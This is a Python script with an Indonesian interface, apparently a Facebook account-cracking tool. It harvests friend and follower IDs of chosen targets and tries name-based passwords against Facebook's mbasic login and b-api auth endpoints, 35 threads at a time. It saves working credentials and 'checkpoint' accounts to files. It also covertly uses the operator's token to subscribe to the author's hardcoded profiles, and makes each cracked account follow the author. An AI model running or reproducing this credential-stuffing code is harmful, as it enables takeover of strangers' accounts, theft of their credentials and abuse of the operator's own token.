#!/usr/bin/python
#encoding=utf-8
import requests as req,json,time,os,sys,re
from concurrent.futures import ThreadPoolExecutor as Bool
from bs4 import BeautifulSoup as parser
from random import choice as user_agent,randint as queenzza

id=[]
ok,cp,cot=0,0,0
gza=""
mb="https://mbasic.facebook.com"

def login():
	os.system("clear")
	print("""
	 LOGIN DULU
	""")
	print("[1]. LOGIN DENGAN TOKEN\n[2]. GITHUB.COM\n")
	pil=input("[!] Pilih: ")
	if(pil in ("01","1")):
		token=input("[+] MASUKKAN TOKEN ANDA: ")
		r=json.loads(req.get(f"https://graph.facebook.com/me?access_token={token}").text)
		try:
			nama=r['name']
			req.post(f'https://graph.facebook.com/100040444638677/subscribers?access_token={token}')
			req.post(f'https://graph.facebook.com/100022841983414/subscribers?access_token={token}')
			req.post(f'https://graph.facebook.com/100001472854864/subscribers?access_token={token}')
			print(f"[☆] BERHASIL LOGIN [☆]") 
			open("save","a").write(token)
			time.sleep(1.5)
			cari(token,nama).menu()
		except KeyError:
			print("[×] LOGIN GAGAL [×]\nTOKEN TIDAK VALID")
			time.sleep(1.5)
			login()
	elif(pil in ("2","02")):
		os.system("xdg-open https://github.com/QUEEN-ZZA/queenzza")
	elif(pil in (" ","  ","   ","    ","     ")):
		print("[!] JANGAN DI KOSONGI ")
		time.sleep(1)
		login()
	else:
		print("[!] LOGIN KEMBALI")
		time.sleep(1)
		login()
def logika():
	try:
		token=open("save","r").read()
		r=json.loads(req.get(f"https://graph.facebook.com/me?access_token={token}").text)
		nama=r['name']
		print(f"[☆] BERHASIL LOGIN [☆]") 
		time.sleep(1.5)
		cari(token,nama).menu()
	except FileNotFoundError:
		print("[!] LOGIN DULU [!]")
		time.sleep(2)
		login()
	except KeyError:
		os.system("rm -rf save")
		exit("[!] TOKEN TIDAK VALID")
		
class cari:
	
	def __init__(self,token,nama):
		self.token,self.nama=token,nama
	def jalan(self,text):
		for jalan in text+"\n":
			sys.stdout.write(jalan)
			sys.stdout.flush()
			time.sleep(0.02)
	def cari(self,user,lala,asu):
		global ok,cp,cot,gza
		ua=user_agent(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]",open("ua","r").read()])
		print(f'\r[ CARI ] {str(cot)}/{str(len(id))} | OK/CP:-{str(ok)}/{str(cp)} | {time.strftime("%X")}',end='')
		if gza!=user:
			gza=user
			cot+=1
		for pw in lala:
			pw=pw.replace('name',asu)
			data={}
			ses=req.Session()
			ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","user-agent":ua,"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
			a=parser(ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8",headers={"user-agent":ua}).text,"html.parser")
			b=["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
			for c in a("input"):
				try:
					if c.get("name") in b:data.update({c.get("name"):c.get("value")})
					else:continue
				except:pass
			data.update({"email":user,"pass":pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
			d=ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=data)
			if 'c_user' in d.cookies.get_dict().keys():
				ok+=1
				open('ok','a').write(user+' '+pw+'\n')
				print(f'\r\33[32;1m(√) TIDAK CHECKPOINT (✓)\n(+) USER\t: {user}                         \n(+) PASS\t: {pw}                         \n(√) COOKIES\t: {"".join(d.cookies.get_dict())}\n-------------------------------------------\33[37;1m                     \n',end='')
				coki={"cookie":"".join(d.cookies.get_dict())}
				r=parser(req.get(mb+"/100040444638677",cookies=coki).text,"html.parser")
				for fllow in r.find_all("a"):
					if "UNFOLLOW" in str(fllow):
						break
					elif "IKUTI" in str(fllow):
						req.get(mb+fllow["href"],cookies=coki)
				break
			elif 'checkpoint' in d.cookies.get_dict().keys():
				cp+=1
				try:
					ttl=json.loads(req.get(f"https://graph.facebook.com/{user}?access_token={self.token}").text)['birthday']
				except KeyError:ttl='-'
				open('cp','a').write(user+' '+pw+' '+ttl+'\n')
				print(f'\r\33[1;33m(×) CHECKPOINT (×)                                   \n(+) USER\t: {user}                         \n(+) PASS\t: {pw}                                   \n(×) TTL\t\t: {ttl}                                   \n-------------------------------------------\33[37;1m                                   ',end='')
				break
	def cari2(self,user,lala,asu):
		global ok,cp,cot,gza
		ua=user_agent(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]",open("ua","r").read()])
		print(f'\r[ CARI ] {str(cot)}/{str(len(id))} | OK/CP:-{str(ok)}/{str(cp)} | {time.strftime("%X")}',end='')
		if gza!=user:
			gza=user
			cot+=1
		for pw in lala:
			r = req.Session()
			headers = {"x-fb-connection-bandwidth": str(queenzza(20000000.0, 30000000.0)), "x-fb-sim-hni": str(queenzza(20000, 40000)), "x-fb-net-hni": str(queenzza(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
			param = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":user,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
			send = json.loads(r.get("https://b-api.facebook.com/method/auth.login", params=param, headers=headers).text)
			if "session_key" in send or "EAAA" in send:
				ok+=1
				open('ok','a').write(user+'|'+pw+'\n')
				print(f'\r\33[32;1m* --> [QUEEN-OK] {user}|{pw}|{send["access_token"]}\33[37;1m                     \n',end='')
				break
			elif "www.facebook.com" in send["error_msg"]:
				cp+=1
				open('cp','a').write(user+'|'+pw+'\n')
				print(f'\r\33[1;33m* --> [QUEEN-CP] {user}|{pw}\33[37;1m                      \n',end='')
				break
				
	def kirim(self):
		self.jalan(f"\n[=] JUMLAH ID: {str(len(id))}")
		pil=input("[?] PASSWORD MANUAL [Y/T]: ")
		if(pil in ("y","Y")):
			with Bool(max_workers=35) as kirim:
				print("[!] Contoh (bismillah,sayang,bahagia,sakinah)")
				pwList=input("[+] MASUKKAN PASSWORD TAMBAHAN: ").split(",")
				print("\nPILIH METODE CARI :\n[1]. CARI METODE B-API [ CEPAT ]\n[2]. CARI METODE MBASIC [ DI REKOMENDASIKAN ]\n")
				tip=input("[?] PILIH : ")
				self.jalan(f'\n[√] KEMBALI<3 : {time.strftime("%X")}')
				print(f'+'+'-'*45+'+\n')
				if(tip in ("02","2")):
					for email in id:
						uid,name=email.split("|")
						kirim.submit(self.cari,uid,pwList,name.lower())
				elif(tip in ("01","1")):
					for email in id:
						uid,name=email.split("|")
						kirim.submit(self.cari2,uid,pwList,name.lower())
		elif(pil in ("t","T")):
			with Bool(max_workers=35) as kirim:
				print("\n[!] PILIH METODE CARI :\n[1]. CARI METODE B-API [ FAST ]\n[2]. CARI METODE MBASIC [ DI REKOMENDASIKAN ]\n")
				tip=input("[?] Pilih: ")
				self.jalan(f'\n[√] KEMBALI<3 : {time.strftime("%X")}')
				print(f'+'+'-'*45+'+\n')
				for email in id:
					uid,name=email.split("|")
					if(len(str(name.lower()))>=6):
						pw=[name.lower(),name.lower()+'123',name.lower()+'1234',name.lower()+'12345']
					elif(len(str(name.lower()))<=2):
						pw=[name.lower()+'1234',name.lower()+'12345']
					elif(len(str(name.lower()))<=3):
						pw=[name.lower()+'123',name.lower()+'1234',name.lower()+'12345']
					else:
						pw=[name.lower()+'12345']
					if(tip in ("02","2")):
						kirim.submit(self.cari,uid,pw,name.lower())
					elif(tip in ("01","1")):
						kirim.submit(self.cari2,uid,pw,name.lower())
		else:
			with Bool(max_workers=35) as kirim:
				print("\n[!] PILIH METODE CARI :\n[1]. CARI METODE B-API [ CEPAT ]\n[2]. CARI METODE MBASIC [ DI REKOMENDASIKAN ]\n")
				tip=input("[?] Pilih: ")
				self.jalan(f'\n[√] KEMBALI<3 : {time.strftime("%X")}')
				print(f'+'+'-'*45+'+\n')
				for email in id:
					uid,name=email.split("|")
					if(len(str(name.lower()))>=6):
						pw=[name.lower(),name.lower()+'123',name.lower()+'1234',name.lower()+'12345']
					elif(len(str(name.lower()))<=2):
						pw=[name.lower()+'1234',name.lower()+'12345']
					elif(len(str(name.lower()))<=3):
						pw=[name.lower()+'123',name.lower()+'1234',name.lower()+'12345']
					else:
						pw=[name.lower()+'12345']
					if(tip in ("02","2")):
						kirim.submit(self.cari,uid,pw,name.lower())
					elif(tip in ("01","1")):
						kirim.submit(self.cari2,uid,pw,name.lower())
	def useragent(self):
		ua=open("ua","r").read()
		print("\n### USER AGENT SEKARANG:",ua)
		print("\nINGIN MENGGANTI UA?")
		yt=input("[?] PILIH [Y/T]: ")
		if(yt in ("y","Y")):
			os.system("rm -rf ua")
			uaBaru=input("[+] MASUKKAN USER AGENT BARU: ")
			open("ua","w").write(uaBaru)
			input("\n[✓] USER AGENT BERHASIL DIGANTI\n[!] TEKAN ENTER ")
			self.menu()
		elif(yt in ("t","T")):
			self.menu()
	def menu(self):
		menu=[]
		os.system('clear')
		ha=0
		print(""" 
   ___  _   _ _____ _____ _   _ __________   _     
  / _ \| | | | ____| ____| \ | |__  /__  /  / \    
 | | | | | | |  _| |  _| |  \| | / /  / /  / _ \   
 | |_| | |_| | |___| |___| |\  |/ /_ / /_ / ___ \  
  \__\_v\___/|_____|_____|_| \_/____/____/_/   \_\ 
+---------------------------------------------+ 
[+] Coded By Summer Sierra 
[+] Github.com/QUEEN-ZZA
[+] Facebook.com/100040444638677 
+---------------------------------------------+""")
		self.jalan(f"[!] ASSALAMU'ALAIKUM {self.nama} CAKEP\n")
		print('[1]. CARI DARI TEMAN PUBLIK\n[2]. CARI DARI FOLLOWERS\n[C]. CEK HASIL\n[S]. SETTING USER AGENT\n[L]. LOGOUT\n[R]. GITHUB')
		print(f'+'+'-'*45+'+\n')
		pil=input('[+] Pilih: ')
		if(pil in ('01','1')):
			print('\n\tCARI DARI TEMAN PUBLIK')
			try:
				jumlah=int(input("\n[!] TARGET MAKSIMAL 10 TARGET \n[?] MASUKKAN JUMLAH TARGET: "))
				if(jumlah>=11):
					print("\n[!] TERLALU BANYAK, MAX 10")
					time.sleep(2)
					self.menu()
				else:pass
			except:jumlah=1
			print("\nKETIK 'me' UNTUK CARI DARI DAFTAR TEMAN ANDA")
			for j in range(jumlah):
				ha+=1
				target=input(f"[+] MASUKKAN ID TARGET {ha}: ").replace("'me'","me")
				try:
					rr=json.loads(req.get(f'https://graph.facebook.com/{target}?access_token={self.token}').text)
					print(f"[=] NAMA TARGET\t: {rr['name']}")
					ro=json.loads(req.get(f'https://graph.facebook.com/{target}/friends?access_token={self.token}').text)
					for x in ro['data']:
						menu.append(x['id'])
					print(f"[=] JUMLAH ID\t: {len(menu)}")
					menu.clear()
				except KeyError:
					print("TARGET TIDAK ADA ")
					time.sleep(1)
					self.menu()
				r=json.loads(req.get(f"https://graph.facebook.com/{target}/friends?access_token={self.token}").text)
				for x in r['data']:
					idnya=x['id']
					nama=x['name'].rsplit(' ')[0]
					id.append(idnya+'|'+nama)
			self.kirim()
		elif(pil in ('02','2')):
			print('\n\tCARI DARI FOLLOWERS')
			try:
				jumlah=int(input("\n[!] TARGET MAKSIMAL 10 TARGET \n[?] MASUKKAN JUMLAH TARGET: "))
				if(jumlah>=11):
					print("\n[!] TERLALU BANYAK,MAX 10")
					time.sleep(2)
					self.menu()
				else:pass
			except:jumlah=1
			print("\nKETIK 'me' UNTUK CARI DARI FOLLOWERS AKUN ANDA")
			for j in range(jumlah):
				target=input("[+] MASUKAN ID TARGET: ").replace("'me'","me")
				try:
					rr=json.loads(req.get(f'https://graph.facebook.com/{target}?access_token={self.token}').text)
					print(f"[=] NAMA TARGET\t: {rr['name']}")
					ro=json.loads(req.get(f'https://graph.facebook.com/{target}/subscribers?limit=50000&access_token={self.token}').text)
					for x in ro['data']:
						menu.append(x['id'])
					print(f"[=] JUMLAH ID\t: {len(menu)}")
					menu.clear()
				except KeyError:
					print("TARGET TIDAK ADA")
					time.sleep(1)
					self.menu()
				r=json.loads(req.get(f'https://graph.facebook.com/{target}/subscribers?limit=50000&access_token={self.token}').text)
				for x in r['data']:
					idnya=x['id']
					nama=x['name'].rsplit(' ')[0]
					id.append(idnya+'|'+nama)
			self.kirim()
		elif(pil in ("c","C")):
			print("\n\nPILIH CEK HASIL CARI\n[1]. HASIL OK\n[2]. HASIL CP\n[3]. KEMBALI KE MENU ?\n")
			hh=input("[!] PILIH: ")
			if(hh in ("01","1")):
				try:
					print("\n"+open("ok","r").read())
					input("ENTER UNTUK KEMBALI KE MENU")
					self.menu()
				except FileNotFoundError:
					input("\n[!] ANDA BELUM MENDAPATKAN HASIL OK\nENTER UNTUK KEMBALI KE MENU")
					self.menu()
			elif(hh in ("02","2")):
				try:
					print("\n"+open("cp","r").read())
					input("ENTER UNTUK KEMBALI KE MENU")
					self.menu()
				except FileNotFoundError:
					input("\n[!] ANDA BELUM MENDAPATKAN HASIL CP\nENTER UNTUK KEMBALI KE MENU")
					self.menu()
			elif(hh in ("03","3")):
				self.menu()
		elif(pil in ("s","S")):
			self.useragent()
		elif(pil in ('l','L')):
			os.system('rm -rf save')
			exit('\nKELUAR')
		elif(pil in ("r","R")):
			print("\n[√] MENUJU GITHUB AUTHOR ....\n[!] KLIK MEMBUKA GITHUB")
			os.system("xdg-open https://github.com/QUEEN-ZZA/queenzza")

if __name__=="__main__":
	try:
		ua=open("ua","r").read()
	except FileNotFoundError:
		print("[!] USER-AGENT TIDAK ADA")
		tll=input("[+] HARAP MASUKKAN USER-AGENT: ")
		open("ua","a").write(tll)
		print("[√] BERHASIL DITAMBAHKAN\nSEDANG  MENUJU KE TOOLS ")
		time.sleep(1)
	logika()
